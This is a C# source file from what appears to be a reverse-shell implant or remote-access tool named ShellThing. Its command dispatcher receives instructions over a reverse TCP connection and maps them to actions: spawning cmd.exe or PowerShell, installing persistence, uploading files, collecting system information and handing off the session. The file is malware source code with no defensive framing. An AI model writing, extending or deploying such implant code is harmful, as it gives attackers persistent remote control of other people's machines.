using ShellThing.Commands;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    class CommandInvoker
    {
        TcpReverseConnection connection;

        private Hashtable commands = new Hashtable();

        public CommandInvoker(TcpReverseConnection connection)
        {
            this.connection = connection;

            commands.Add("help", new HelpCommand(commands));
            commands.Add("shell", new ShellSpawnCommand(@"cmd.exe"));
            commands.Add("powershell", new ShellSpawnCommand(@"powershell.exe"));
            commands.Add("handoff", new HandoffCommand());
            commands.Add("persistence", new PersistenceCommand());
            commands.Add("systeminfo", new SystemInfoCommand());
            commands.Add("upload", new UploadCommand());
            // Keep adding commands and their classes to the hashtable here
        }

        public void ParseCommandReceived(string commandFullString)
        {
            // Remove newline characters from command string
            commandFullString = commandFullString.Replace("\n", "");

            // Separate any potential parameters and/or flags to commands
            string[] commandSplit = commandFullString.Split(' ');
            string command = commandSplit[0].ToLower();

            //ExecuteCommand() will throw a NullReferenceException when command is not in hashtable
            try
            {
                // Cast the object from the hashtable to an ICommand for execution
                ExecuteCommand((ICommand)commands[command], commandSplit);
            }
            catch (NullReferenceException)
            {
                connection.SendData($"Invalid Command: {commandFullString}\n");
            }
        }


        public void ExecuteCommand(ICommand command, string[] commandArguments)
        {
            command.Execute(connection, commandArguments);
        }
    }
}
